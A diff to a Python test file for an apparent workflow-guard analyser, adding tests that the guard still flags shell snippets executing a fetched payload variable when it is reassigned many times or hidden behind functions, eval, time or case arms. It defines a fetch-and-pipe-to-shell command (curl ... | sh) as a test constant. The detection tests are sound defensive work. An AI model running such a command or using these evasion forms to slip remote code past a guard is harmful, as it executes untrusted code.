@@ -15,6 +15,7 @@ import unittest
 
 import shell_lex
 import workflow_guard as wg
+import workflow_uses
 
 URL = "https://example.test/"
 PIPE = "curl -fsSL %si.sh | sh" % URL
@@ -205,6 +206,45 @@ class TestACallsEffectIsReadFailClosed(unittest.TestCase):
             for shell in SHELLS:
                 with self.subTest(row=row, shell=shell):
                     self.assertTrue(reported(filled(row), shell))
+
+
+class TestTheCarryPastTheCandidateCap(unittest.TestCase):
+    """PR #2855 round 3 (B1 and F1). Past the candidate cap (`_CANDIDATES`, eight) the table
+    held a carried name's stand-in alone, which a use reads as nothing: eight body assignments
+    went CLEAN while every parent runs `P` (seven still reported). The merge back into the
+    caller's table never drops the caller's own candidates now. F1: `time f` and `eval f` run
+    the function (no wrapper), and the arm of a one-line `case` is stepped past before the head
+    walk, so a group, an assignment, a `!` or an `if` between the arm and the call still reach
+    it. `main`'s own top-level cap (x20) stands, named in the gap list."""
+
+    SEVEN = "T=a; T=b; T=c; T=d; T=e; T=f; T=g"
+    EIGHT = SEVEN + "; T=h"
+    NINE = EIGHT + "; T=i"
+    ROWS = ('T=@P@; f() { if false; then %s; fi; }; f; sh "$T"' % SEVEN,
+            'T=@P@; f() { if false; then %s; fi; }; f; sh "$T"' % EIGHT,
+            'T=@P@; f() { if false; then %s; fi; }; f; sh "$T"' % NINE,
+            'T=@P@; f() { if false; then unset T; %s; fi; }; f; sh "$T"' % SEVEN[5:],
+            'T=@P@; g() { if false; then %s; fi; }; f() { g; }; f; sh "$T"' % EIGHT,
+            'T=@P@; f() { if false; then %s; fi; }; f; bash "$T"' % EIGHT,
+            'T=@P@; f() { if false; then %s; fi; }; f; U=$T; sh "$U"' % EIGHT,
+            'T=@P@; f() { if false; then %s; fi; }; f; sh "$T" || :' % EIGHT,
+            'T=/dev/null; f() { T=@P@; }; time f; sh "$T"', 'T=/dev/null; f() { T=@P@; }; eval f; sh "$T"',
+            'T=/dev/null; f() { T=@P@; }; case x in x) { f; };; esac; sh "$T"',
+            'T=/dev/null; f() { T=@P@; }; case x in x) X=1 f;; esac; sh "$T"',
+            'T=/dev/null; f() { T=@P@; }; case x in x) ! f;; esac; sh "$T"',
+            'T=/dev/null; f() { T=@P@; }; case x in x) if f; then :; fi;; esac; sh "$T"')
+
+    def test_each_row_is_reported_under_every_shell_setting(self):
+        for row in self.ROWS:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(filled(row), shell))
+
+    def test_the_callers_value_stands_beside_the_stand_in(self):
+        stmts = wg.shell_reader.statements('T=P; f() { if false; then %s; fi; }; f; sh "$T"\n' % self.NINE)
+        table = workflow_uses.static_values(stmts, len(stmts) - 1).scalars["T"]
+        self.assertEqual("P", table[0])
+        self.assertIn("$T", table)
 
 
 class TestEveryHeaderSpellingTheSeatAskedFor(unittest.TestCase):
